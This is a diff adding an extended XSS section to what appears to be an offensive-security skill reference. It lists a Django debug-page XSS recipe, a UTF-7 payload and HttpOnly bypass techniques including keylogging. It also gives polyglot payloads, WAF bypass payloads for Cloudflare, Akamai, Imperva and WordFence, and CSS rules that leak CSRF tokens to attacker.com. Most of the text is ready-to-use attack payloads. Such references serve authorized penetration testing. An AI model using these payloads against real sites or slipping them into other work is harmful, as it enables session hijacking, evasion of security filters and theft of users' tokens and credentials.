@@ -2362,3 +2362,96 @@ The script automatically: checks CSP headers â†’ injects a canary to find r
 - `references/payloads.md` â€” payload list by context
 - `references/tools.md` â€” dalfox, XSStrike, Burp usage
 
+
+
+---
+
+## From hack-skills: XSS — Extended Scenarios & CVE Cases
+
+### CVE-2017-12794: Django Debug Page XSS
+
+Conditions: `DEBUG=True` in production (common misconfiguration).
+
+```
+1. Register username: <script>alert(1)</script>
+2. Try to register AGAIN with same username
+3. Django raises IntegrityError with duplicate key value
+4. Debug page renders error including unescaped username → XSS
+```
+
+### UTF-7 XSS (Legacy IE)
+
+When page doesn't specify charset and IE auto-detects encoding:
+```
++/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+```
+`+ADw-` = `<` in UTF-7. Only works if `Content-Type: text/html; charset=utf-8` is NOT set.
+
+### HttpOnly Bypass Strategies
+
+HttpOnly prevents `document.cookie` access — but XSS can still:
+
+| Technique | How |
+|---|---|
+| Proxy the browser | XSS sends authenticated XHR requests (no cookie needed) |
+| CSRF via XSS | Read CSRF token from DOM → perform state-changing action |
+| Keylogger | Capture credentials as victim types |
+| Session riding | Browse app via injected JS, extract response data |
+
+### XSS Polyglot Payloads
+
+```javascript
+// 0xsobky universal:
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+// s0md3v:
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+
+// Polyglot for multiple contexts:
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
+```
+
+### WAF Bypass by Vendor
+
+**Cloudflare:**
+```html
+<svg onload=prompt``>
+<img src=x onnull=alert(1)>
+<a href="java
+script:alert(1)">click</a>
+```
+
+**Akamai:**
+```html
+</script><base href="javascript:/a]/-alert(1)//">
+<dETAILS open oNtoggle=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+```
+
+**Incapsula (Imperva):**
+```html
+<script>$.globalEval("al"+"ert(1)")</script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+```
+
+**WordFence:**
+```html
+<a href="javas&#99;ript:alert(1)">click</a>
+<img src=x onerror="&#x61;lert(1)">
+```
+
+### CSS Injection Data Exfiltration
+
+When CSS injection is possible but not JavaScript (CSP allows `unsafe-inline` for styles):
+
+```css
+/* Extract CSRF token character by character via attribute selector: */
+input[name="csrf"][value^="a"] { background: url(https://attacker.com/?token=a); }
+input[name="csrf"][value^="b"] { background: url(https://attacker.com/?token=b); }
+/* Each request to attacker.com reveals matching prefix */
+
+/* @font-face unicode-range side channel (detect chars in text nodes): */
+@font-face { font-family: probe; src: url(https://attacker.com/?char=A); unicode-range: U+0041; }
+.secret-text { font-family: probe; }
+/* Browser only loads the font for chars that actually appear in element */
+```
